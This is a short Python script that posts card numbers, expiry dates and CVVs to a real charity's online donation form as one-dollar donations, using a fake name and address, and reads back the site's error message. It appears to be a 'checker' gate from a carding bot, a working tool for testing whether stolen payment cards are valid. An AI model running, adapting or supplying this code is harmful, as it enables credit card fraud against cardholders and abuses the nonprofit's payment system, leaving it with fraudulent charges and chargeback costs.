import asyncio
import aiohttp
import re
from all.configs._def_main_ import parseX
from all.functions.func_imp import *


async def tomorifun(cc, mes, ano, cvv):
    email = get_email()
    async with aiohttp.ClientSession() as sess:
        headers = {
            'authority': 'judsonslegacy.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://judsonslegacy.org',
            'referer': 'https://judsonslegacy.org/donate',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        data = {
            'on0': 'Enter Your Donation:',
            'amt_sug': '1',
            'amt': '',
            'email': f'{email}',
            'firstname': 'Idk',
            'lastname': 'Idk',
            'street': '1184 McKinley Avenue',
            'city': 'Denver',
            'state': 'Colorado',
            'zip': '80014',
            'country': 'US',
            'note': '',
            'creditcardtype': 'visa',
            'creditcardnumber': f'{cc}',
            'expdatemonth': f'{mes}',
            'expdateyear': f'{ano}',
            'cvv2number': f'{cvv}',
            'submit.x': '50',
            'submit.y': '13',
        }
        await asyncio.sleep(3)
        async with sess.post('https://judsonslegacy.org/donate', headers=headers, data=data) as resp:
            await asyncio.sleep(3)
            req1 = await resp.text()
            msg = parseX(req1, '<p style="color:#ff0000;">', '</p>')
            if msg == "None":
                print(msg)
                msg = "New Response"
            return msg
